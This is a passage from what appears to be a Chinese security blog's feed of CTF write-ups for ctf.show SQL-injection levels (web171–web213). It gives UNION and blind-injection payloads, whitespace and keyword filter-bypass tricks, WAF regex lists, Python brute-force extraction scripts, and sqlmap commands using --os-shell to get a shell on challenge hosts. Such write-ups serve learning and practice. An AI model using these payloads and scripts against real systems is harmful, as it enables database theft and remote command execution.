class="keyword">return</span> preg_match(<span class="string">&#x27;/ |\*/&#x27;</span>, $<span class="built_in">str</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>加了个星号，无关痛痒，还用上一题的即可。<br>payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://29fa0dfe-7f52-4f70-<span class="number">83e9</span>-2795e92dcb6b.challenge.ctf.show/api/index.php --data=<span class="string">&quot;id=1&quot;</span> --refer=<span class="string">&quot;ctf.show&quot;</span> --method=<span class="string">&quot;PUT&quot;</span> --headers=<span class="string">&quot;Content-Type:text/plain&quot;</span> --safe-url=<span class="string">&quot;http://29fa0dfe-7f52-4f70-83e9-2795e92dcb6b.challenge.ctf.show/api/getToken.php&quot;</span> --safe-freq=<span class="number">1</span> --tamper=ctfshow210 --batch -D ctfshow_web --dump</span><br></pre></td></tr></table></figure><h1 id="web213"><a href="#web213" class="headerlink" title="web213"></a>web213</h1><h3 id="–os-shell-一键getshell"><a href="#–os-shell-一键getshell" class="headerlink" title="–os-shell 一键getshell"></a>–os-shell 一键getshell</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://97a2ce63-a000-<span class="number">4020</span>-838b-9eccc076d657.challenge.ctf.show/api/index.php --data=<span class="string">&quot;id=1&quot;</span> --method=PUT --headers=<span class="string">&quot;Content-Type: text/plain&quot;</span> --safe-url=<span class="string">&quot;http://97a2ce63-a000-4020-838b-9eccc076d657.challenge.ctf.show/api/getToken.php&quot;</span> --safe-freq=<span class="number">1</span>  --tamper=ctfshow210.py --os-shell</span><br></pre></td></tr></table></figure><h2 id="什么是–os-shell"><a href="#什么是–os-shell" class="headerlink" title="什么是–os-shell"></a>什么是–os-shell</h2><p>–os-shell 其本质是写入两个shell文件，其中一个可以命令执行，另一个则是可以让我们上传文件；<br>不过也是有限制的，上传文件我们需要受到两个条件的限制，一个是网站的绝对路径，另一个则是导入导出的权限</p><p>在mysql中，由 secure_file_priv 参数来控制导入导出权限，该参数后面为null时，则表示不允许导入导出；如果是一个文件夹，则表示仅能在这个文件夹中导入导出；如果参数后面为空，也就是没有值时，则表示在任何文件夹都能导入导出<br>payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://899832c9-<span class="number">8556</span>-49fb-8f82-2b4156bed9bf.challenge.ctf.show/api/index.php --data=<span class="string">&quot;id=1&quot;</span> --method=PUT --headers=<span class="string">&quot;Content-Type: text/plain&quot;</span> --safe-url=<span class="string">&quot;http://899832c9-8556-49fb-8f82-2b4156bed9bf.challenge.ctf.show/api/getToken.php&quot;</span> --safe-freq=<span class="number">1</span>  --tamper=ctfshow210 --batch --level=<span class="number">5</span> --os-shell</span><br></pre></td></tr></table></figure><p>然后就会出现shell页面：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689175482915-61978078-d777-4dbe-820b-ad1b742325f8.png" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689175522091-1b21cb86-9dfb-4896-8dca-fdd1bf8d1d85.png" alt="image.png"><br>执行完输入q退出即可</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
            <tag> CTFshow0-1 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web171-web190SQL注入篇</title>
      <link href="/2023/07/11/web171-web190SQL%E6%B3%A8%E5%85%A5%E7%AF%87/"/>
      <url>/2023/07/11/web171-web190SQL%E6%B3%A8%E5%85%A5%E7%AF%87/</url>
      
        <content type="html"><![CDATA[<p>web171</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = <span class="string">&quot;select username,password from user where username !=&#x27;flag&#x27; and id = &#x27;&quot;</span>.$_GET<span class="punctuation">[</span>&#x27;id&#x27;<span class="punctuation">]</span>.<span class="string">&quot;&#x27; limit 1;&quot;</span>;</span><br></pre></td></tr></table></figure><p>三栏一眼丁真，直接内容拼入即可。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span>&#x27; union select <span class="number">1</span><span class="punctuation">,</span><span class="number">2</span><span class="punctuation">,</span>database() --+</span><br></pre></td></tr></table></figure><p>查询库名：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span>&#x27; union select <span class="number">1</span><span class="punctuation">,</span><span class="number">2</span><span class="punctuation">,</span>group_concat(schema_name) from information_schema.schemata --+</span><br></pre></td></tr></table></figure><p><code>information_schema,test,mysql,performance_schema,ctfshow_web</code><br>查询表名：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span>&#x27; union select <span class="number">1</span><span class="punctuation">,</span><span class="number">2</span><span class="punctuation">,</span>group_concat(table_name) from information_schema.tables where table_schema=database() --+</span><br></pre></td></tr></table></figure><p><code>ctfshow_user</code><br>查询字段</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span>&#x27; union select <span class="number">1</span><span class="punctuation">,</span><span class="number">2</span><span class="punctuation">,</span>group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_user&#x27; --+</span><br></pre></td></tr></table></figure><p><code>id,username,password</code><br>三栏直接输出三种：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span>&#x27; union select id<span class="punctuation">,</span>username<span class="punctuation">,</span>password from ctfshow_web.ctfshow_user --+</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688962855743-a9561019-8b4a-4ad8-a1b9-9829a17ae716.png" alt="image.png"><br>当然 sqlmap也是可以的。直接开注入</p><h1 id="web172"><a href="#web172" class="headerlink" title="web172"></a>web172</h1><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = <span class="string">&quot;select username,password from ctfshow_user2 where username !=&#x27;flag&#x27; and id = &#x27;&quot;</span>.$_GET<span class="punctuation">[</span>&#x27;id&#x27;<span class="punctuation">]</span>.<span class="string">&quot;&#x27; limit 1;&quot;</span>;</span><br></pre></td></tr></table></figure><p>现实位置变为了两个。<br>通过上题的数据库结构可以直接出payload</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span>&#x27; union select <span class="number">1</span><span class="punctuation">,</span>password from ctfshow_web.ctfshow_user2  --+</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688978037707-0ffcb803-78fd-4c25-93a9-2c20d87eaa92.png" alt="image.png"></p><h1 id="web173"><a href="#web173" class="headerlink" title="web173"></a>web173</h1><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//拼接sql语句查找指定ID用户</span></span><br><span class="line">$sql = <span class="string">&quot;select id,username,password from ctfshow_user3 where username !=&#x27;flag&#x27; and id = &#x27;&quot;</span>.$_GET<span class="punctuation">[</span>&#x27;id&#x27;<span class="punctuation">]</span>.<span class="string">&quot;&#x27; limit 1;&quot;</span>;</span><br></pre></td></tr></table></figure><p>一样payload</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span>&#x27; union select <span class="number">1</span><span class="punctuation">,</span><span class="number">2</span><span class="punctuation">,</span>password from ctfshow_web.ctfshow_user3 --+</span><br></pre></td></tr></table></figure><h1 id="web174、web175"><a href="#web174、web175" class="headerlink" title="web174、web175"></a>web174、web175</h1><p>说是考的基础，那么就一步一步来。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//拼接sql语句查找指定ID用户</span></span><br><span class="line">$sql = <span class="string">&quot;select id,username,password from ctfshow_user2 where username !=&#x27;flag&#x27; and id = &#x27;&quot;</span>.$_GET<span class="punctuation">[</span>&#x27;id&#x27;<span class="punctuation">]</span>.<span class="string">&quot;&#x27; limit 1;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//检查结果是否有flag</span></span><br><span class="line">    if(!preg_match(&#x27;/flag/i&#x27;<span class="punctuation">,</span> json_encode($ret)))<span class="punctuation">&#123;</span></span><br><span class="line">      $ret<span class="punctuation">[</span>&#x27;msg&#x27;<span class="punctuation">]</span>=&#x27;查询成功&#x27;;</span><br><span class="line">    <span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>有返回过滤了。<br>174、175怎么输入什么都提示错误。</p><h1 id="web176"><a href="#web176" class="headerlink" title="web176"></a>web176</h1><h3 id="大小写绕过过滤"><a href="#大小写绕过过滤" class="headerlink" title="大小写绕过过滤"></a>大小写绕过过滤</h3><p>简单过滤，大小写就能绕过过滤。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span>&#x27; uNion SeLeCt <span class="number">1</span><span class="punctuation">,</span><span class="number">2</span><span class="punctuation">,</span>password from ctfshow_user --+</span><br></pre></td></tr></table></figure><h1 id="web177"><a href="#web177" class="headerlink" title="web177"></a>web177</h1><h3 id="、-09、-0a-d绕过空格过滤"><a href="#、-09、-0a-d绕过空格过滤" class="headerlink" title="/**/、%09、%0a-%d绕过空格过滤"></a>/**/、%09、%0a-%d绕过空格过滤</h3><blockquote><p><a href="https://blog.csdn.net/acsuccess/article/details/69360931">https://blog.csdn.net/acsuccess/article/details/69360931</a> 绕过空格过滤</p></blockquote><p>过滤了空格，把空格更换一下即可<br>以下是几种常见绕过过滤的方法。</p><ul><li>注释绕过 <code>/**/</code></li><li>括号绕过 <code>select(user())from dual where(1=1)and(2=2)</code></li></ul><p>除此之外要注意一下，上面几道题的payload中的+会被转义为空格，因此如果使用+就会出现无法查询的情况。<br>那么就要使用url转义来绕过空格。<br>比如：</p><ul><li>Tab &gt; %09</li><li>换页符 &gt; %0c</li></ul><p>这两个都是可以的。<br>于是就可以得到payload：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">0</span>&#x27;<span class="comment">/**/</span>union<span class="comment">/**/</span>select<span class="comment">/**/</span>id<span class="punctuation">,</span>username<span class="punctuation">,</span>password<span class="comment">/**/</span>from<span class="comment">/**/</span>ctfshow_user<span class="comment">/**/</span>--%<span class="number">09</span></span><br></pre></td></tr></table></figure><h1 id="web178"><a href="#web178" class="headerlink" title="web178"></a>web178</h1><h3 id="、-09、-0a-d绕过空格过滤-1"><a href="#、-09、-0a-d绕过空格过滤-1" class="headerlink" title="/**/、%09、%0a-%d绕过空格过滤"></a>/**/、%09、%0a-%d绕过空格过滤</h3><p>把<code>/**/</code>过滤掉了那就只能使用上面两个转义符绕过了。<br>那就用%09</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span>&#x27;%<span class="number">09</span>union%<span class="number">09</span>select%<span class="number">091</span><span class="punctuation">,</span><span class="number">2</span><span class="punctuation">,</span>password%<span class="number">09</span>from%<span class="number">09</span>ctfshow_user%<span class="number">09</span>--%<span class="number">09</span></span><br></pre></td></tr></table></figure><p>注意，经过测试，<code>%09</code>可以替换为<code>%0a-%0d</code>均可以</p><h1 id="web179"><a href="#web179" class="headerlink" title="web179"></a>web179</h1><h3 id="、-09、-0a-d绕过空格过滤-2"><a href="#、-09、-0a-d绕过空格过滤-2" class="headerlink" title="/**/、%09、%0a-%d绕过空格过滤"></a>/**/、%09、%0a-%d绕过空格过滤</h3><p><code>/**/</code>等都被过滤了，可以使用%0c和%0d绕过过滤。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span>&#x27;%<span class="number">0</span>cunion%<span class="number">0</span>cselect%<span class="number">0</span>c1<span class="punctuation">,</span><span class="number">2</span><span class="punctuation">,</span>password%<span class="number">0</span>cfrom%<span class="number">0</span>cctfshow_user%<span class="number">0</span>c--%<span class="number">0</span>c</span><br></pre></td></tr></table></figure><h1 id="web180-web182"><a href="#web180-web182" class="headerlink" title="web180-web182"></a>web180-web182</h1><p>过滤了所有的空白符号。<br>这里网上给的办法是直接去根据id直接查，其实也可以。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span>&#x27;||id=<span class="number">26</span>||&#x27;</span><br><span class="line">或者</span><br><span class="line"><span class="number">-1</span>&#x27;or(id=<span class="number">26</span>)and&#x27;&#x27;=&#x27;</span><br></pre></td></tr></table></figure><p>可以使用第二种这种将末尾的单引号闭合就可以不用注释符号了</p><h1 id="web183"><a href="#web183" class="headerlink" title="web183"></a>web183</h1><h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function waf($str)<span class="punctuation">&#123;</span></span><br><span class="line">    return preg_match(&#x27;/ |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|file|\=|or|\x7c|select|and|flag|into/i&#x27;<span class="punctuation">,</span> $str);</span><br><span class="line">  <span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>有两种payload。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">[</span>POST<span class="punctuation">]</span>PAYLOAD<span class="punctuation">:</span></span><br><span class="line">tableName=`ctfshow_user`where((substr(`pass`<span class="punctuation">,</span><span class="number">1</span><span class="punctuation">,</span><span class="number">8</span>)regexp(<span class="string">&quot;ctfshow&#123;&quot;</span>)))</span><br><span class="line"></span><br><span class="line"><span class="punctuation">[</span>POST<span class="punctuation">]</span>PAYLOAD<span class="punctuation">:</span></span><br><span class="line">tableName=(ctfshow_user)where(pass)like&#x27;ctfshow<span class="punctuation">&#123;</span>%<span class="number">25</span>&#x27;</span><br></pre></td></tr></table></figure><p>这里分别解释一下两个语句：</p><h2 id="regexp和like关键字-和-标识符"><a href="#regexp和like关键字-和-标识符" class="headerlink" title="regexp和like关键字 %和_标识符"></a>regexp和like关键字 %和_标识符</h2><p>第一个payload：<br>REGEXP 是 SQL 中的一个模式匹配操作符，它用于在字符串中查找与给定的正则表达式匹配的子串。<br>第二个paylaod：<br>LIKE操作符使用字符串匹配模式来比较列的值，常见的模式匹配特殊字符是 % (百分号) 和 _ (下划线)。<br>‘aa%’：这是一个用于匹配的模式。在这个例子中，’aa%’表示以”aa”开头的任意字符或字符串。%是LIKE操作符的通配符，代表任意数量的字符（包括零个字符）。<br>也就是匹配<code>aabbs</code><br>当我们使用 LIKE 操作符和下划线 _ 结合时，它表示匹配单个字符的任意位置，类似于通配符?<br>也就是匹配<code>aab</code><br>这里使用py写脚本。<br>第一种：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">@File    :   SQL盲注.py   </span></span><br><span class="line"><span class="string">@Contact :   2997453446@qq.com</span></span><br><span class="line"><span class="string">@Blog    :   natro92.github.io</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">@Modify Time      @Author    @Version    @Desciption</span></span><br><span class="line"><span class="string">------------      -------    --------    -----------</span></span><br><span class="line"><span class="string">2023/7/10 17:49   natro92      1.0         None</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">url = <span class="string">r&#x27;http://0d89238a-2c87-4371-b427-2670ebb10351.challenge.ctf.show/select-waf.php&#x27;</span></span><br><span class="line"><span class="built_in">str</span> = <span class="string">r&#x27;0123456789-abcdefghijklmnopqrstuvwxyz&#125;&#x27;</span></span><br><span class="line">flag_pre = <span class="string">&#x27;ctfshow&#123;&#x27;</span></span><br><span class="line">payload = <span class="string">&quot;(ctfshow_user)where(pass)regexp&#x27;&#123;&#125;&#x27;&quot;</span></span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">key = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">if</span> key == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;tableName&#x27;</span>: payload.<span class="built_in">format</span>(flag_pre + j)</span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;$user_count = 1&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            flag_pre += j</span><br><span class="line">            <span class="built_in">print</span>(flag_pre)</span><br><span class="line">            <span class="keyword">if</span> j == <span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">                key = <span class="number">1</span></span><br></pre></td></tr></table></figure><p>第二种：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">@File    :   SQL盲注.py   </span></span><br><span class="line"><span class="string">@Contact :   2997453446@qq.com</span></span><br><span class="line"><span class="string">@Blog    :   natro92.github.io</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">@Modify Time      @Author    @Version    @Desciption</span></span><br><span class="line"><span class="string">------------      -------    --------    -----------</span></span><br><span class="line"><span class="string">2023/7/10 17:49   natro92      1.0         None</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">url = <span class="string">r&#x27;http://0d89238a-2c87-4371-b427-2670ebb10351.challenge.ctf.show/select-waf.php&#x27;</span></span><br><span class="line"><span class="built_in">str</span> = <span class="string">r&#x27;0123456789-abcdefghijklmnopqrstuvwxyz&#125;&#x27;</span></span><br><span class="line">flag_pre = <span class="string">&#x27;ctfshow&#123;&#x27;</span></span><br><span class="line">payload = <span class="string">&#x27;(ctfshow_user)where(pass)like&quot;&#123;&#125;%&quot;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">key = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">if</span> key == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;tableName&#x27;</span>: payload.<span class="built_in">format</span>(flag_pre + j)</span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;count = 1&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            flag_pre += j</span><br><span class="line">            <span class="built_in">print</span>(flag_pre)</span><br><span class="line">            <span class="keyword">if</span> j == <span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">                key = <span class="number">1</span></span><br></pre></td></tr></table></figure><h1 id="web184"><a href="#web184" class="headerlink" title="web184"></a>web184</h1><h3 id="右连接"><a href="#右连接" class="headerlink" title="右连接"></a>右连接</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//对传入的参数进行了过滤</span><br><span class="line">  function waf($<span class="built_in">str</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> preg_match(<span class="string">&#x27;/\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\x00|\#|\x23|file|\=|or|\x7c|select|and|flag|into|where|\x26|\&#x27;|\&quot;|union|\`|sleep|benchmark/i&#x27;</span>, $<span class="built_in">str</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="什么是右连接"><a href="#什么是右连接" class="headerlink" title="什么是右连接"></a>什么是右连接</h2><p>SQL 中的右连接（Right Join）用于将两个表按照指定的列进行连接，并返回右侧表中所有行及其与左侧表中匹配行的列值，如果左侧表中没有匹配的行，则返回 NULL 值。<br>比如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SELECT columns</span><br><span class="line">FROM table1</span><br><span class="line">RIGHT JOIN table2</span><br><span class="line">ON table1.column = table2.column;</span><br></pre></td></tr></table></figure><p>比如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SELECT students.name, scores.score</span><br><span class="line">FROM students</span><br><span class="line">RIGHT JOIN scores</span><br><span class="line">ON students.<span class="built_in">id</span> = scores.student_id;</span><br></pre></td></tr></table></figure><p>在这个例子中，我们使用 RIGHT JOIN 将 scores 表右连接到 students 表上，按照 students.id 和 scores.student_id 进行连接，查询学生姓名和对应的成绩。如果 scores 表中没有匹配的行，则返回 NULL 值。<br>因此这道题里面就可以使用如下payload：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tableName<span class="operator">=</span>ctfshow_user <span class="keyword">as</span> a <span class="keyword">right</span> <span class="keyword">join</span> ctfshow_user <span class="keyword">as</span> b <span class="keyword">on</span> b.pass <span class="keyword">like</span> <span class="number">0x63746673686f7725</span></span><br></pre></td></tr></table></figure><p><code>0x63746673686f7725</code>是ctfshow%的十六进制编码<br>python中可以使用以下代码实现转换为十六进制：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="built_in">print</span>(binascii.b2a_hex(<span class="built_in">str</span>(<span class="string">&#x27;ctfshow%&#x27;</span>).encode()).decode().replace(<span class="string">&quot;b&#x27;&quot;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&quot;&#x27;&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br></pre></td></tr></table></figure><p>然后就可以写脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">@File    :   SQL盲注2.py</span></span><br><span class="line"><span class="string">@Contact :   2997453446@qq.com</span></span><br><span class="line"><span class="string">@Blog    :   natro92.github.io</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">@Modify Time      @Author    @Version    @Desciption</span></span><br><span class="line"><span class="string">------------      -------    --------    -----------</span></span><br><span class="line"><span class="string">2023/7/10 19:49   natro92      1.0         None</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_2hex</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    :param s: 需要转为十六进制的字符串</span></span><br><span class="line"><span class="string">    :return: 十六进制结果</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> binascii.b2a_hex(s.encode()).decode().replace(<span class="string">&quot;b&#x27;&quot;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&quot;&#x27;&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">r&#x27;http://303b0ea1-6fc8-4947-9730-47d85b4a3c1c.challenge.ctf.show/select-waf.php&#x27;</span></span><br><span class="line"><span class="built_in">str</span> = <span class="string">r&#x27;0123456789abcdefghijklmnopqrstuvwxyz-&#125;&#x27;</span></span><br><span class="line">flag_pre = <span class="string">&#x27;ctfshow&#123;&#x27;</span></span><br><span class="line">payload = <span class="string">&quot;ctfshow_user as a right join ctfshow_user as b on b.pass like &#123;&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">key = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">if</span> key == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;tableName&#x27;</span>: payload.<span class="built_in">format</span>(<span class="string">&#x27;0x&#x27;</span> + _2<span class="built_in">hex</span>(flag_pre + j + <span class="string">&quot;%&quot;</span>))</span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;$user_count = 43&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            flag_pre += j</span><br><span class="line">            <span class="built_in">print</span>(flag_pre)</span><br><span class="line">            <span class="keyword">if</span> j == <span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">                key = <span class="number">1</span></span><br><span 